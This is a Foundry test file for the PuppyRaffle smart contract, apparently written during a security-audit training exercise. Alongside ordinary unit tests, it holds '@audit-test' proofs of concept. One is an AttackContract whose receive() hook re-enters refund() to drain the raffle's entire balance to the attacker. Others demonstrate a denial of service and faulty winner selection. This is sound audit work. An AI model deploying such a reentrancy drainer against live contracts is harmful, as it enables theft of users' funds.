// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract AttackContract {
    PuppyRaffle immutable i_raffle;
    uint256 immutable i_entranceFee;
    address immutable i_player;

    constructor(PuppyRaffle raffle, uint256 entranceFee) {
        i_raffle = raffle;
        i_entranceFee = entranceFee;
        i_player = msg.sender;
    }

    function attack(uint256 index) external {
        if (msg.sender == i_player) {
            i_raffle.refund(index);
        }
    }

    receive() external payable {
        uint256 index = i_raffle.getActivePlayerIndex(address(this));
        if (address(i_raffle).balance >= i_entranceFee) {
            console.log("Entered here: ", address(this).balance);
            i_raffle.refund(index);
        } else {
            (bool success,) = i_player.call{value: address(this).balance}("");
            console.log("success: ", success);
        }
    }
}

contract PuppyRaffleTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address playerOne = address(1);
    address playerTwo = address(2);
    address playerThree = address(3);
    address playerFour = address(4);
    address feeAddress = address(99);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, duration);
    }

    //////////////////////
    /// EnterRaffle    ///
    /////////////////////

    function testCanEnterRaffle() public {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        assertEq(puppyRaffle.players(0), playerOne);
    }

    function testCantEnterWithoutPaying() public {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        vm.expectRevert("PuppyRaffle: Must send enough to enter raffle");
        puppyRaffle.enterRaffle(players);
    }

    function testCanEnterRaffleMany() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
        assertEq(puppyRaffle.players(0), playerOne);
        assertEq(puppyRaffle.players(1), playerTwo);
    }

    function testCantEnterWithoutPayingMultiple() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        vm.expectRevert("PuppyRaffle: Must send enough to enter raffle");
        puppyRaffle.enterRaffle{value: entranceFee}(players);
    }

    function testCantEnterWithDuplicatePlayers() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerOne;
        vm.expectRevert("PuppyRaffle: Duplicate player");
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
    }

    function testCantEnterWithDuplicatePlayersMany() public {
        address[] memory players = new address[](3);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerOne;
        vm.expectRevert("PuppyRaffle: Duplicate player");
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);
    }
    //@audit-test

    function test_DOS_Attack_On_EnterRaffle() external playersEntered {
        //1. 4 players entered
        //2. 2 players asked refunds
        //3. No one can enter the raffle now
        uint256 playerOneIndex = puppyRaffle.getActivePlayerIndex(playerOne);
        uint256 playerThreeIndex = puppyRaffle.getActivePlayerIndex(playerThree);
        vm.prank(playerOne);
        puppyRaffle.refund(playerOneIndex);
        vm.prank(playerThree);
        puppyRaffle.refund(playerThreeIndex);
        address[] memory newPlayers = new address[](2);
        newPlayers[0] = address(5);
        newPlayers[1] = address(6);
        vm.expectRevert("PuppyRaffle: Duplicate player");
        puppyRaffle.enterRaffle{value: entranceFee * 2}(newPlayers);
    }

    //////////////////////
    /// Refund         ///
    /////////////////////
    modifier playerEntered() {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        _;
    }

    function testCanGetRefund() public playerEntered {
        uint256 balanceBefore = address(playerOne).balance;
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);

        vm.prank(playerOne);
        puppyRaffle.refund(indexOfPlayer);

        assertEq(address(playerOne).balance, balanceBefore + entranceFee);
    }

    function testGettingRefundRemovesThemFromArray() public playerEntered {
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);

        vm.prank(playerOne);
        puppyRaffle.refund(indexOfPlayer);

        assertEq(puppyRaffle.players(0), address(0));
    }

    function testOnlyPlayerCanRefundThemself() public playerEntered {
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);
        vm.expectRevert("PuppyRaffle: Only the player can refund");
        vm.prank(playerTwo);
        puppyRaffle.refund(indexOfPlayer);
    }

    //@audit-test
    function test_Reentrancy_Attack_On_Refund() external playersEntered {
        address player = makeAddr("Player");
        uint256 playerInitialBalance = player.balance;

        //1. Deploy the attack contract
        vm.prank(player);
        AttackContract attackContract = new AttackContract(puppyRaffle, entranceFee);
        address[] memory newPlayer = new address[](1);
        newPlayer[0] = address(attackContract);
        //2. Enter the raffle
        puppyRaffle.enterRaffle{value: entranceFee}(newPlayer);
        //3. Asks for refund.
        uint256 attackIndex = puppyRaffle.getActivePlayerIndex(address(attackContract));
        vm.prank(player);
        attackContract.attack(attackIndex);

        //4. Drains the pool.
        assertEq(address(puppyRaffle).balance, 0);
        assertGt(player.balance, playerInitialBalance);
    }

    //////////////////////
    /// getActivePlayerIndex         ///
    /////////////////////
    function testGetActivePlayerIndexManyPlayers() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);

        assertEq(puppyRaffle.getActivePlayerIndex(playerOne), 0);
        assertEq(puppyRaffle.getActivePlayerIndex(playerTwo), 1);
    }

    //////////////////////
    /// selectWinner         ///
    /////////////////////
    modifier playersEntered() {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        _;
    }

    function testCantSelectWinnerBeforeRaffleEnds() public playersEntered {
        vm.expectRevert("PuppyRaffle: Raffle not over");
        puppyRaffle.selectWinner();
    }

    function testCantSelectWinnerWithFewerThanFourPlayers() public {
        address[] memory players = new address[](3);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = address(3);
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        vm.expectRevert("PuppyRaffle: Need at least 4 players");
        puppyRaffle.selectWinner();
    }
    //@audit-bug test case failing

    function testSelectWinner() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.previousWinner(), playerFour);
    }

    function testSelectWinnerGetsPaid() public playersEntered {
        uint256 balanceBefore = address(playerFour).balance;

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        uint256 expectedPayout = ((entranceFee * 4) * 80 / 100);

        puppyRaffle.selectWinner();
        assertEq(address(playerFour).balance, balanceBefore + expectedPayout);
    }

    function testSelectWinnerGetsAPuppy() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.balanceOf(playerFour), 1);
    }

    function testPuppyUriIsRight() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        string memory expectedTokenUri =
            "data:application/json;base64,eyJuYW1lIjoiUHVwcHkgUmFmZmxlIiwgImRlc2NyaXB0aW9uIjoiQW4gYWRvcmFibGUgcHVwcHkhIiwgImF0dHJpYnV0ZXMiOiBbeyJ0cmFpdF90eXBlIjogInJhcml0eSIsICJ2YWx1ZSI6IGNvbW1vbn1dLCAiaW1hZ2UiOiJpcGZzOi8vUW1Tc1lSeDNMcERBYjFHWlFtN3paMUF1SFpqZmJQa0Q2SjdzOXI0MXh1MW1mOCJ9";

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.tokenURI(0), expectedTokenUri);
    }

    //@audit-test
    function test_Reverts_If_Refund_Occurs_Before_Winner() external playersEntered {
        address[] memory newPlayers = new address[](2);
        newPlayers[0] = makeAddr("player 5");
        newPlayers[1] = makeAddr("player 6");

        puppyRaffle.enterRaffle{value: entranceFee * 2}(newPlayers);
        uint256 player5Index = puppyRaffle.getActivePlayerIndex(newPlayers[0]);
        uint256 player6Index = puppyRaffle.getActivePlayerIndex(newPlayers[1]);
        vm.prank(newPlayers[0]);
        puppyRaffle.refund(player5Index);

        vm.prank(newPlayers[1]);
        puppyRaffle.refund(player6Index);

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        //Expected to revert
        vm.expectRevert("PuppyRaffle: Failed to send prize pool to winner");
        puppyRaffle.selectWinner();
    }
    //@audit-test

    function test_Previous_Winner_Is_Always_Addresses_Zero() external playersEntered {
        address[] memory newPlayers = new address[](2);
        newPlayers[0] = makeAddr("player 5");
        newPlayers[1] = makeAddr("player 6");
        puppyRaffle.enterRaffle{value: entranceFee * 2}(newPlayers);

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();
        console.log("Winner: ", puppyRaffle.previousWinner());
        assertEq(puppyRaffle.previousWinner(), address(0));
    }

    //@audit-test
    function test_Revert_When_TO_Be_Winner_Takes_Out_Refund() external playersEntered {
        address[] memory newPlayers = new address[](4);
        newPlayers[0] = makeAddr("player 5");
        newPlayers[1] = makeAddr("player 6");
        newPlayers[2] = makeAddr("player 7");
        newPlayers[3] = makeAddr("player 8");
        puppyRaffle.enterRaffle{value: entranceFee * 4}(newPlayers);
        //player 8 is going to be the winner
        vm.prank(newPlayers[3]);
        puppyRaffle.refund(7);

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        vm.expectRevert("ERC721: mint to the zero address");
        puppyRaffle.selectWinner();
    }

    //////////////////////
    /// withdrawFees         ///
    /////////////////////
    function testCantWithdrawFeesIfPlayersActive() public playersEntered {
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }

    function testWithdrawFees() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        uint256 expectedPrizeAmount = ((entranceFee * 4) * 20) / 100;

        puppyRaffle.selectWinner();
        puppyRaffle.withdrawFees();
        assertEq(address(feeAddress).balance, expectedPrizeAmount);
    }
}
